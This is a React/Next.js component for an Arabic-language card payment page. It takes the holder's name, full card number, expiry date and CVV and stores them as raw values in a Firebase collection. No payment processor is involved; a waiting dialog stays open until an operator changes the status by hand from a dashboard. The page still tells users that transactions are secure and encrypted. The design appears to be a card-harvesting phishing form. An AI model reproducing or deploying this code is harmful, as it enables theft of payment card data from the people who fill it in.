"use client";

import type React from "react";
import { useState, useEffect } from "react";
import type { z } from "zod";
import { doc, onSnapshot } from "firebase/firestore";
import { CreditCard, Calendar, Lock, User } from "lucide-react";
import { addData, db } from "@/lib/firebase";
import { useRouter } from "next/navigation";
import { usePaymentForm } from "./paymentform";
import { PaymentSchema } from "./schema";
import WaitingDialog from "../waiting-dilaog";

export default function PaymentForm() {
  const { formData, isSubmitting, updateFormField } = usePaymentForm();
  const [isLoading, setLoading] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState<
    "idle" | "pending" | "processing" | "success" | "error"
  >("idle");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [paymentId, setPaymentId] = useState<string | null>(null);
  const [cardType, setCardType] = useState<"visa" | "mastercard" | "unknown">(
    "unknown"
  );
  const router = useRouter();

  // Check for existing payment status in localStorage on component mount
  useEffect(() => {
    if (typeof window !== "undefined") {
      const storedPaymentStatus = localStorage.getItem("paymentStatus");
      const storedPaymentId = localStorage.getItem("visitor");

      if (storedPaymentId) {
        setPaymentId(storedPaymentId);
      }

      // Only set loading to true if status is pending or processing
      if (
        storedPaymentStatus === "pending" ||
        storedPaymentStatus === "processing"
      ) {
        setPaymentStatus(storedPaymentStatus as "pending" | "processing");
        setLoading(true);
      } else {
        setLoading(false);
      }
    }
  }, []);

  // Set up real-time listener for payment status changes
  useEffect(() => {
    if (!paymentId) return;

    // Reference to the payment document
    const paymentRef = doc(db, "pays", paymentId);

    // Set up real-time listener
    const unsubscribe = onSnapshot(
      paymentRef,
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data();

          // Update payment status based on Firebase data
          if (data.paymentStatus) {
            setPaymentStatus(data.paymentStatus);

            // Keep dialog open only for pending or processing status
            if (
              data.paymentStatus === "pending" ||
              data.paymentStatus === "processing"
            ) {
              setLoading(true);
              localStorage.setItem("paymentStatus", data.paymentStatus);
            } else {
              // For any other status (success, error, etc.), show briefly then close
              setTimeout(() => {
                setLoading(false);
                localStorage.removeItem("paymentStatus");
              }, 2000);
            }
          }
        } else {
          // Document doesn't exist
          setLoading(false);
          localStorage.removeItem("paymentStatus");
        }
      },
      (error) => {
        console.error("Error fetching payment status:", error);
        setLoading(false);
        localStorage.removeItem("paymentStatus");
      }
    );

    // Clean up the listener when component unmounts
    return () => unsubscribe();
  }, [paymentId]);

  // Additional effect to ensure dialog state matches payment status
  useEffect(() => {
    // Only keep dialog open for pending or processing status
    if (paymentStatus === "pending" || paymentStatus === "processing") {
      setLoading(true);
    } else if (paymentStatus === "success" || paymentStatus === "error") {
      // For success or error, show briefly then close
      setTimeout(() => {
        setLoading(false);
      }, 2000);
    } else {
      // For any other status (idle), close immediately
      setLoading(false);
    }
  }, [paymentStatus]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    // Remove spaces from card number before validation
    const validationData = {
      ...formData,
      card_number: formData.card_number.replace(/\s/g, ""),
    };

    // Check for rejected card prefixes before validation
    const rejectedPrefixes = ["9999"];

    const cardNumber = validationData.card_number;
    const isRejectedCard = rejectedPrefixes.some((prefix) =>
      cardNumber.startsWith(prefix)
    );

    if (isRejectedCard) {
      setErrors({
        ...errors,
        card_number: "هذه البطاقة غير مقبولة للدفع",
      });
      return;
    }

    const paymentResult = PaymentSchema.safeParse(validationData);

    if (!paymentResult.success) {
      const formattedErrors: Record<string, string> = {};
      paymentResult.error.errors.forEach(
        (error: { path: (string | number)[]; message: string }) => {
          if (error.path[0]) {
            formattedErrors[error.path[0].toString()] = error.message;
          }
        }
      );
      setErrors(formattedErrors);
      return;
    }

    setErrors({});
    setLoading(true);
    setPaymentStatus("processing");

    try {
      const _id = localStorage.getItem("visitor");

      if (!_id) {
        throw new Error("Visitor ID not found");
      }

      // Create a new payment record with pending status
      await addData({
        id: _id,
        ...formData,
        paymentStatus: "pending",
      });

      // Store visitor ID as payment ID for tracking
      localStorage.setItem("paymentStatus", "pending");

      // The dialog will stay open until the payment status is updated from the dashboard
    } catch (error) {
      console.error("Payment error:", error);
      setPaymentStatus("error");
      setErrors({
        general: "حدث خطأ أثناء معالجة الدفع. يرجى المحاولة مرة أخرى.",
      });
      setTimeout(() => {
        setLoading(false);
        localStorage.removeItem("paymentStatus");
      }, 1500);
    }
  };

  // Function to refresh the page
  const handleRefresh = () => {
    window.location.reload();
  };

  const handleInputChange =
    (field: keyof z.infer<typeof PaymentSchema>) =>
    (e: React.ChangeEvent<HTMLInputElement>) => {
      let value = e.target.value;

      // Format card number with spaces after every 4 digits
      if (field === "card_number") {
        // Remove any non-digit characters
        const digitsOnly = value.replace(/\D/g, "");

        // Limit to 16 digits
        const limitedDigits = digitsOnly.substring(0, 16);

        // Detect card type
        if (limitedDigits.startsWith("4")) {
          setCardType("visa");
        } else if (limitedDigits.startsWith("5")) {
          setCardType("mastercard");
        } else {
          setCardType("unknown");
        }

        // Check for rejected card prefixes
        const rejectedPrefixes = ["9999"];

        // Check if card starts with any rejected prefix
        const isRejectedCard = rejectedPrefixes.some((prefix) =>
          limitedDigits.startsWith(prefix)
        );

        if (isRejectedCard) {
          setErrors((prev) => ({
            ...prev,
            card_number: "هذه البطاقة غير مقبولة للدفع",
          }));
        }
        // Check if the card starts with 4 or 5
        else if (
          limitedDigits.length > 0 &&
          !["4", "5"].includes(limitedDigits[0])
        ) {
          setErrors((prev) => ({
            ...prev,
            card_number: "رقم البطاقة يجب أن يبدأ بـ 4 أو 5",
          }));
        } else {
          // Clear the specific error if it exists
          if (
            errors.card_number === "رقم البطاقة يجب أن يبدأ بـ 4 أو 5" ||
            errors.card_number === "هذه البطاقة غير مقبولة للدفع"
          ) {
            setErrors((prev) => {
              const newErrors = { ...prev };
              delete newErrors.card_number;
              return newErrors;
            });
          }
        }

        // Format with spaces after every 4 digits
        let formattedValue = "";
        for (let i = 0; i < limitedDigits.length; i++) {
          if (i > 0 && i % 4 === 0) {
            formattedValue += " ";
          }
          formattedValue += limitedDigits[i];
        }

        value = formattedValue;
      }

      // Format expiration date with slash after month (MM/YY)
      if (field === "expiration_date") {
        // Remove any non-digit characters except for the slash
        const cleaned = value.replace(/[^\d/]/g, "");

        // Handle backspace and deletion properly
        if (cleaned.length <= 2) {
          // Just the month part
          const month = cleaned;

          // Validate month is between 01-12
          if (month.length === 2) {
            const monthNum = Number.parseInt(month, 10);
            if (monthNum < 1 || monthNum > 12) {
              setErrors((prev) => ({
                ...prev,
                expiration_date: "الشهر يجب أن يكون بين 01 و 12",
              }));
            } else {
              // Clear month-specific error if it exists
              if (errors.expiration_date === "الشهر يجب أن يكون بين 01 و 12") {
                setErrors((prev) => {
                  const newErrors = { ...prev };
                  delete newErrors.expiration_date;
                  return newErrors;
                });
              }
            }
          }

          value = month;
        } else {
          // Handle the full MM/YY format
          const parts = cleaned.split("/");

          if (parts.length === 1) {
            // User hasn't typed the slash yet, but has entered more than 2 digits
            if (parts[0].length > 2) {
              const month = parts[0].substring(0, 2);
              const year = parts[0].substring(2, 4);

              // Validate month
              const monthNum = Number.parseInt(month, 10);
              if (monthNum < 1 || monthNum > 12) {
                setErrors((prev) => ({
                  ...prev,
                  expiration_date: "الشهر يجب أن يكون بين 01 و 12",
                }));
              } else {
                // Clear month-specific error if it exists
                if (
                  errors.expiration_date === "الشهر يجب أن يكون بين 01 و 12"
                ) {
                  setErrors((prev) => {
                    const newErrors = { ...prev };
                    delete newErrors.expiration_date;
                    return newErrors;
                  });
                }
              }

              value = `${month}/${year}`;
            }
          } else if (parts.length === 2) {
            const month = parts[0].substring(0, 2);
            const year = parts[1].substring(0, 2);

            // Validate month
            const monthNum = Number.parseInt(month, 10);
            if (monthNum < 1 || monthNum > 12) {
              setErrors((prev) => ({
                ...prev,
                expiration_date: "الشهر يجب أن يكون بين 01 و 12",
              }));
            } else {
              // Clear month-specific error if it exists
              if (errors.expiration_date === "الشهر يجب أن يكون بين 01 و 12") {
                setErrors((prev) => {
                  const newErrors = { ...prev };
                  delete newErrors.expiration_date;
                  return newErrors;
                });
              }
            }

            value = `${month}/${year}`;
          }
        }

        // Limit to 5 characters (MM/YY)
        value = value.substring(0, 5);
      }

      // Format CVV to only allow digits and limit to 3 characters
      if (field === "cvv") {
        value = value.replace(/\D/g, "").substring(0, 3);
      }

      updateFormField({ [field]: value });

      // Clear error for this field when user starts typing
      if (
        errors[field] &&
        !(
          field === "card_number" &&
          (errors.card_number === "رقم البطاقة يجب أن يبدأ بـ 4 أو 5" ||
            errors.card_number === "هذه البطاقة غير مقبولة للدفع")
        )
      ) {
        setErrors((prev) => {
          const newErrors = { ...prev };
          delete newErrors[field];
          return newErrors;
        });
      }
    };

  return (
    <div className="max-w-md mx-auto p-8 bg-white rounded-xl shadow-lg border border-gray-100">
      <WaitingDialog
        isOpen={isLoading}
        paymentStatus={paymentStatus}
        onRefresh={handleRefresh}
      />

      <div className="mb-8 text-center">
        <div className="flex justify-center mb-4">
          <div className="w-16 h-16 bg-[#146394] rounded-full flex items-center justify-center">
            <CreditCard className="w-8 h-8 text-white" />
          </div>
        </div>
        <h2 className="text-2xl font-bold text-center mb-2">معلومات الدفع</h2>
        <p className="text-gray-500 text-sm">
          يرجى إدخال تفاصيل بطاقتك لإتمام عملية الدفع
        </p>
      </div>

      {errors.general && (
        <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg">
          <p className="text-red-600 text-sm text-right">{errors.general}</p>
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-5">
        <div className="space-y-2">
          <label
            htmlFor="card_holder_name"
            className="block text-right font-medium text-gray-700 flex items-center justify-end gap-2"
          >
            <User className="w-4 h-4" />
            اسم حامل البطاقة
          </label>
          <div className="relative">
            <input
              id="card_holder_name"
              type="text"
              value={formData.card_holder_name}
              onChange={handleInputChange("card_holder_name")}
              className={`w-full p-3 border rounded-lg ${
                errors.card_holder_name ? "border-red-500" : "border-gray-300"
              } focus:outline-none focus:ring-2 focus:ring-[#146394] focus:border-transparent transition-all duration-200`}
              dir="rtl"
              placeholder="أدخل اسم حامل البطاقة"
            />
          </div>
          {errors.card_holder_name && (
            <p className="text-red-500 text-sm text-right">
              {errors.card_holder_name}
            </p>
          )}
        </div>

        <div className="space-y-2">
          <label
            htmlFor="card_number"
            className="block text-right font-medium text-gray-700 flex items-center justify-end gap-2"
          >
            <CreditCard className="w-4 h-4" />
            رقم البطاقة
          </label>
          <div className="relative">
            <input
              id="card_number"
              type="tel"
              value={formData.card_number}
              onChange={handleInputChange("card_number")}
              placeholder="XXXX XXXX XXXX XXXX"
              className={`w-full p-3 border rounded-lg ${
                errors.card_number ? "border-red-500" : "border-gray-300"
              } focus:outline-none focus:ring-2 focus:ring-[#146394] focus:border-transparent transition-all duration-200 pr-12`}
              dir="ltr"
            />
            {cardType !== "unknown" && (
              <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                {cardType === "visa" ? (
                  <img src="/v.png" alt="Visa" className="h-6" />
                ) : (
                  <img src="/m.png" alt="Mastercard" className="h-6" />
                )}
              </div>
            )}
          </div>
          {errors.card_number && (
            <p className="text-red-500 text-sm text-right">
              {errors.card_number}
            </p>
          )}
        </div>

        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-2">
            <label
              htmlFor="expiration_date"
              className="block text-right font-medium text-gray-700 flex items-center justify-end gap-2"
            >
              <Calendar className="w-4 h-4" />
              تاريخ الانتهاء
            </label>
            <input
              id="expiration_date"
              type="tel"
              value={formData.expiration_date}
              onChange={handleInputChange("expiration_date")}
              placeholder="MM/YY"
              className={`w-full p-3 border rounded-lg ${
                errors.expiration_date ? "border-red-500" : "border-gray-300"
              } focus:outline-none focus:ring-2 focus:ring-[#146394] focus:border-transparent transition-all duration-200`}
              dir="ltr"
            />
            {errors.expiration_date && (
              <p className="text-red-500 text-sm text-right">
                {errors.expiration_date}
              </p>
            )}
          </div>

          <div className="space-y-2">
            <label
              htmlFor="cvv"
              className="block text-right font-medium text-gray-700 flex items-center justify-end gap-2"
            >
              <Lock className="w-4 h-4" />
              رمز الأمان (CVV)
            </label>
            <input
              id="cvv"
              type="tel"
              maxLength={3}
              value={formData.cvv}
              onChange={handleInputChange("cvv")}
              placeholder="123"
              className={`w-full p-3 border rounded-lg ${
                errors.cvv ? "border-red-500" : "border-gray-300"
              } focus:outline-none focus:ring-2 focus:ring-[#146394] focus:border-transparent transition-all duration-200`}
              dir="ltr"
            />
            {errors.cvv && (
              <p className="text-red-500 text-sm text-right">{errors.cvv}</p>
            )}
          </div>
        </div>

        <div className="pt-6">
          <button
            type="submit"
            className="w-full bg-[#146394] text-white py-4 rounded-lg font-semibold transform transition-all duration-300 hover:bg-[#0d4e77] active:scale-[0.98] shadow-md hover:shadow-lg text-base relative overflow-hidden disabled:opacity-50 disabled:cursor-not-allowed"
            disabled={isSubmitting || isLoading}
          >
            <span className="relative z-10">
              {isSubmitting || isLoading ? "جاري المعالجة..." : "إتمام الدفع"}
            </span>
          </button>
        </div>

        <div className="flex justify-center mt-4 space-x-4">
          <div className="w-12 h-8 bg-gray-100 rounded flex items-center justify-center">
            <img src="/v.png" alt="Visa" className="h-6" />
          </div>
          <div className="w-12 h-8 bg-gray-100 rounded flex items-center justify-center">
            <img src="/m.png" alt="Mastercard" className="h-6" />
          </div>
        </div>

        <p className="text-xs text-gray-500 text-center mt-4">
          جميع المعاملات آمنة ومشفرة
        </p>
      </form>
    </div>
  );
}
